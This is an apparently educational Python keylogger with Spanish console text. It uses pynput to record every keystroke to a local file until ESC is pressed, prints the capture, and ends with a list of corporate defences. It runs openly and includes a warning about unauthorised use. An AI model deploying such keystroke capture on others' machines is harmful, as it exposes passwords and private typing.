from pynput import keyboard
import datetime
import os

LOG_FILE = "keylog_edu.txt"

def escribir_log(texto):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(texto)

def on_press(key):
    try:
        escribir_log(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            escribir_log(' ')
        elif key == keyboard.Key.enter:
            escribir_log('\n')
        elif key == keyboard.Key.backspace:
            escribir_log('[BACKSPACE]')
        elif key == keyboard.Key.tab:
            escribir_log('[TAB]')
        else:
            escribir_log('[' + str(key).replace('Key.', '') + ']')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def demo():
    print("\n" + "="*55)
    print("  KEYLOGGER EDUCACIONAL")
    print("  Andres Felipe Cuervo - Ciberseguridad")
    print("  Fecha: " + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    print("="*55)
    print("\n  ADVERTENCIA: Solo uso educativo y en equipos propios")
    print("  Uso no autorizado es ILEGAL")
    print("\n  Registrando teclas en: " + LOG_FILE)
    print("  Presiona ESC para detener\n")
    
    escribir_log("\n--- Sesion iniciada: " + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + " ---\n")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    print("\n  Keylogger detenido.")
    print("  Log guardado en: " + LOG_FILE)
    
    if os.path.exists(LOG_FILE):
        print("\n  CONTENIDO CAPTURADO:")
        print("  " + "-"*40)
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            contenido = f.read()
        print("  " + contenido)
        print("  " + "-"*40)
    
    print("\n" + "="*55)
    print("  COMO SE DEFIENDE UNA EMPRESA:")
    print("  - Antivirus con deteccion de keyloggers")
    print("  - EDR (Endpoint Detection and Response)")
    print("  - Monitorizacion de procesos sospechosos")
    print("  - Autenticacion de dos factores (2FA)")
    print("  - Teclados virtuales para datos sensibles")
    print("="*55 + "\n")

demo()